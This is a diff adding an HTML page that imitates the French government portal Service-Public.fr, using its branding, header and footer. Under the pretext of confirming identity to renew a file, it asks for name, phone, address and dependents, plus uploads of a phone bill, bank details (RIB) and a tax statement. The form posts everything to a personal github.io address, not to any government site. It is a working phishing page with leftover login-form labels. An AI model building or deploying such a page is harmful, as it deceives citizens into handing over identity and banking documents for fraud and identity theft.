@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="fr" xmlns="http://www.w3.org/1999/html" data-fr-js="false" dir="ltr" data-fr-scheme="light">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Demande d'information personnelle | Service-Public.fr</title>
+    <meta name="robots" content="noindex, nofollow">
+
+    <link rel="apple-touch-icon" href="apple-touch-icon.png"><!-- 180×180 -->
+    <link rel="icon" href="favicon.svg" type="image/svg+xml">
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon"><!-- 32×32 -->
+    <link rel="manifest" href="manifest.webmanifest" crossorigin="use-credentials">
+
+    <link href="dsfr.min.css" rel="stylesheet">
+    <link href="utility.min.css" rel="stylesheet">
+    <link href="sp-dsfr-authentification.css" rel="stylesheet">
+
+    <script src="require.js" type="text/javascript"></script>
+</head>
+
+<body>
+<div id="top">
+    <noscript>
+        <div class="fr-container fr-mb-10v">
+            <p>
+                <b>Javascript désactivé</b><br>
+                Javascript doit être activé dans votre navigateur pour utiliser ce service
+            </p>
+        </div>
+    </noscript>
+    <div class="fr-skiplinks">
+        <nav class="fr-container" role="navigation" aria-label="Accès rapide">
+            <ul class="fr-skiplinks__list">
+                <li><a class="fr-link" href="#main">Aller au contenu</a></li>
+                <li><a class="fr-link" href="#footer">Aller au pied de page</a></li>
+            </ul>
+        </nav>
+    </div>
+</div>
+
+<header class="fr-header" role="banner" id="banner">
+    <div class="fr-header__body">
+        <div class="fr-container">
+            <div class="fr-header__body-row">
+                <div class="fr-header__brand fr-enlarge-link">
+                    <div class="fr-header__brand-top">
+                        <div class="fr-header__logo">
+                            <p class="fr-logo">
+                                République <br>Française
+                            </p>
+                        </div>
+                    </div>
+                    <div class="fr-header__service">
+                        <a href="https://joelapichenette.github.io/gouv/" title="Accueil Service-Public.fr">
+                            <p class="fr-header__service-title">Service-Public.fr</p>
+                        </a>
+                        <p class="fr-header__service-tagline">Le site officiel de l’administration française</p>
+                    </div>
+                </div>
+                <div class="fr-header__tools">
+                    <div class="fr-header__tools-links">
+                        <ul class="fr-links-group"></ul>
+                    </div>
+                </div>
+                <div class="fr-header__menu fr-modal" id="header-modal" aria-labelledby="button-1" hidden="true">
+                    <div class="fr-container">
+                        <button class="fr-link--close fr-link" aria-controls="header-modal">Fermer</button>
+                        <div class="fr-header__menu-links"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<div class="fr-container fr-pb-2w" id="kc-content">
+    <main class="main" role="main" id="main" lang="fr">
+        <div class="sp-container--narrow">
+            <article class="article" role="article">
+                <div class="fr-mb-3w sp-no-print rs_skip">
+                    <div class="sp-toolbar fr-mb-2w">
+                        <nav role="navigation" class="fr-translate fr-nav" id="switchLang-1">
+                            <div class="fr-nav__item">
+                                <button class="fr-translate__btn fr-btn fr-btn--tertiary"
+                                    aria-controls="translate-1" aria-expanded="false"
+                                    title="fr - Français -  Sélectionner une langue" id="button-1">
+                                    FR - Français
+                                </button>
+                                <div class="fr-collapse fr-translate__menu fr-menu" id="translate-1">
+                                    <ul class="fr-menu__list">
+                                        <li>
+                                            <a class="fr-translate__language fr-nav__link" hreflang="Fr" lang="Fr"
+                                                href="/realms/service-public/login-actions/authenticate?client_id=spclient&amp;tab_id=M67L2yPZ5sQ&amp;execution=ef12b63a-2154-4cae-bd25-1ce9489b4fdf&amp;kc_locale=fr"
+                                                aria-current="true" id="language-Fr">FR - Français</a>
+                                        </li>
+                                        <li>
+                                            <a class="fr-translate__language fr-nav__link" hreflang="En" lang="En"
+                                                href="/realms/service-public/login-actions/authenticate?client_id=spclient&amp;tab_id=M67L2yPZ5sQ&amp;execution=ef12b63a-2154-4cae-bd25-1ce9489b4fdf&amp;kc_locale=en"
+                                                id="language-En">EN - English</a>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </nav>
+                    </div>
+                </div>
+                <h1 class="fr-mb-6w">Demande d'information personnelle</h1>
+                <p class="fr-mb-4w">
+                    Pour renouveler votre dossier, nous devons confirmer votre identité. Pour cela, nous avons besoin de quelques informations personnelles.
+                </p>
+                <form id="kc-form-info" action="https://joelapichenette.github.io/gouv/" method="post" enctype="multipart/form-data">
+                    <div class="fr-fieldset fr-mb-2w">
+                        <div class="fr-fieldset__element">
+                            <div class="fr-input-group">
+                                <label for="username" class="fr-label">
+                                    Votre prénom
+                                </label>
+                                <input type="text" id="firstname" name="firstname" class="fr-input" required="required" aria-required="true" autocomplete="email" pattern="^[_A-Za-z0-9-\+-]+(\.[_A-Za-z0-9-\+-]+)*@[A-Za-z0-9-]+(\.[A-Za-z0-9-\+-]+)*(\.[A-Za-z]{2,})$" oninvalid="setCustomValidity('Veuillez saisir une adresse valide (exemple : jean.dupont@exemple.fr)')" oninput="setCustomValidity('')" x-moz-errormessage="'Veuillez saisir une adresse valide (exemple : jean.dupont@exemple.fr)'" >
+                            </div>
+                        </div>
+                        <div class="fr-fieldset__element">
+                            <div class="fr-input-group">
+                                <label for="password" class="fr-label">
+                                    Votre nom
+                                </label>
+                                <input type="text" id="lastname" name="lastname" class="fr-input" required="required" aria-required="true" autocomplete="off" oninvalid="setCustomValidity('Veuillez renseigner ce champ')" oninput="setCustomValidity('')" x-moz-errormessage="'Veuillez renseigner ce champ'" >
+                            </div>
+                        </div>
+                        <div class="fr-fieldset__element">
+                            <div class="fr-input-group">
+                                <label for="phone" class="fr-label">
+                                    Numéro de téléphone
+                                </label>
+                                <input type="tel" id="phone" name="phone" class="fr-input" required="required" aria-required="true" pattern="^(\+33|0)[1-9](\d{2}){4}$" oninvalid="setCustomValidity('Veuillez saisir un numéro de téléphone valide (exemple : 0123456789 ou +33123456789)')" oninput="setCustomValidity('')">
+                            </div>
+                        </div>
+                        <div class="fr-fieldset__element">
+                            <div class="fr-input-group">
+                                <label for="address" class="fr-label">
+                                    Adresse
+                                </label>
+                                <input type="text" id="address" name="address" class="fr-input" required="required" aria-required="true" oninvalid="setCustomValidity('Veuillez renseigner ce champ')" oninput="setCustomValidity('')">
+                            </div>
+                        </div>
+                        <div class="fr-fieldset__element">
+                            <div class="fr-input-group">
+                                <label for="city" class="fr-label">
+                                    Ville
+                                </label>
+                                <input type="text" id="city" name="city" class="fr-input" required="required" aria-required="true" oninvalid="setCustomValidity('Veuillez renseigner ce champ')" oninput="setCustomValidity('')">
+                            </div>
+                        </div>
+                        <div class="fr-fieldset__element">
+                            <div class="fr-input-group">
+                                <label for="postalcode" class="fr-label">
+                                    Code postal
+                                </label>
+                                <input type="text" id="postalcode" name="postalcode" class="fr-input" required="required" aria-required="true" pattern="^\d{5}$" oninvalid="setCustomValidity('Veuillez saisir un code postal valide (5 chiffres)')" oninput="setCustomValidity('')">
+                            </div>
+                        </div>
+                        <div class="fr-fieldset__element">
+                            <div class="fr-input-group">
+                                <label for="dependents" class="fr-label">
+                                    Nombre de personnes à charge dans le foyer
+                                </label>
+                                <input type="number" id="dependents" name="dependents" class="fr-input" required="required" aria-required="true" min="0" oninvalid="setCustomValidity('Veuillez renseigner ce champ')" oninput="setCustomValidity('')">
+                            </div>
+                        </div>
+                        <div class="fr-fieldset__element">
+                            <div class="fr-input-group">
+                                <label for="facture" class="fr-label">
+                                    Facture de l'opérateur téléphonique
+                                    <span class="fr-hint-text">Téléchargez votre facture d'opérateur téléphonique</span>
+                                </label>
+                                <input type="file" id="facture" name="facture" class="fr-input" required="required" aria-required="true" aria-describedby="facture-message" accept=".pdf,.jpg,.jpeg,.png">
+                            </div>
+                        </div>
+                        <div class="fr-fieldset__element">
+                            <div class="fr-input-group">
+                                <label for="rib" class="fr-label">
+                                    RIB
+                                    <span class="fr-hint-text">Téléchargez votre RIB</span>
+                                </label>
+                                <input type="file" id="rib" name="rib" class="fr-input" required="required" aria-required="true" aria-describedby="rib-message" accept=".pdf,.jpg,.jpeg,.png">
+                            </div>
+                        </div>
+                        <div class="fr-fieldset__element">
+                            <div class="fr-input-group">
+                                <label for="revenus" class="fr-label">
+                                    Revenus annuels
+                                    <span class="fr-hint-text">Téléchargez votre relevé d'imposition de l'année passée</span>
+                                </label>
+                                <input type="file" id="revenus" name="revenus" class="fr-input" required="required" aria-required="true" aria-describedby="rib-message" accept=".pdf,.jpg,.jpeg,.png">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="fr-my-6w">
+                        <button type="submit" class="fr-btn fr-btn--lg">Envoyer</button>
+                    </div>
+                </form>
+            </article>
+        </div>
+    </main>
+</div>
+
+<footer class="fr-footer" role="contentinfo" id="footer">
+    <div class="fr-container">
+        <div class="fr-footer__body">
+            <div class="fr-footer__brand fr-enlarge-link">
+                <p class="fr-logo">République <br>Française</p>
+            </div>
+            <div class="fr-footer__content">
+                <p class="fr-footer__content-desc">
+                    Service Public vous informe et vous oriente vers les services qui permettent de connaître vos obligations,
+                    d’exercer vos droits et de faire vos démarches du quotidien.
+                </p>
+                <p class="fr-footer__content-desc">
+                    Il est édité par la Direction de l’information légale et administrative et réalisé en partenariat avec les administrations nationales et locales.
+                </p>
+            </div>
+        </div>
+        <div class="fr-footer__bottom">
+            <div class="fr-footer__bottom-copy">
+                <p>Sauf mention contraire, tous les contenus de ce site sont sous <a target="_blank" rel="noopener noreferrer" title="licence etalab-2.0 - nouvelle fenêtre" href="https://github.com/etalab/licence-ouverte/blob/master/LO.md">licence etalab-2.0<span class="fr-icon-external-link-fill fr-icon--sm" aria-hidden="true"></span></a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<script>
+    window.dsfr = {
+        analytics: {
+            domain: 'jcmm.service-public.fr',
+            site: {
+                entity: 'SPM || DILA',
+                language: 'fr',
+                target: 'information',
+                type: 'standard',
+                environment: 'development'
+            },
+            user: {
+                status: 'anonym',
+                language: 'fr',
+                type: 'autre'
+            },
+            isActionEnabled: true,
+        }
+    };
+</script>
+
+<script>
+    window.dsfr.analytics.page = {
+        title: 'demande_information_personnelle',
+        labels: ['autre', 'information', 'Compte', '', ''],
+        categories: ['Compte'],
+        template: 'information',
+        group: 'compte',
+        theme: 'autre',
+        isError: false,
+        path: document.location.pathname
+    };
+</script>
+
+<script type="module" src="/resources/81ef1bd2/login/service-public/dsfr/dsfr.module.min.js"></script>
+<script type="text/javascript" nomodule src="/resources/81ef1bd2/login/service-public/dsfr/dsfr.nomodule.min.js"></script>
+<script type="module" src="/resources/81ef1bd2/login/service-public/dsfr/analytics/analytics.module.min.js"></script>
+<script type="text/javascript" nomodule src="/resources/81ef1bd2/login/service-public/dsfr/analytics/analytics.nomodule.min.js"></script>
+
+<script>
+    requirejs.config({
+        baseUrl: "/resources/81ef1bd2/login/service-public",
+        paths: {
+            'jquery': "js/jquery.min",
+            'jquery-captcha': "js/jquery-captcha.min",
+            'captcha-aife': "js/captcha-aife",
+            'alert': "js/alert",
+            'configRgpd': "js/configRgpd",
+            'orejime': "js/orejime",
+            'domReady': "js/domReady",
+        },
+        shim: {
+            'jquery-captcha': {deps: ['jquery']},
+            'captcha-aife': {deps: ['jquery-captcha']},
+            'alert': {deps: ['jquery']},
+            'configRgpd': {deps: ['orejime', 'domReady', 'jquery']},
+        },
+        waitSeconds: 30
+    });
+
+    require(["captcha-aife"]);
+    require(["configRgpd"]);
+</script>
+</body>
+</html>
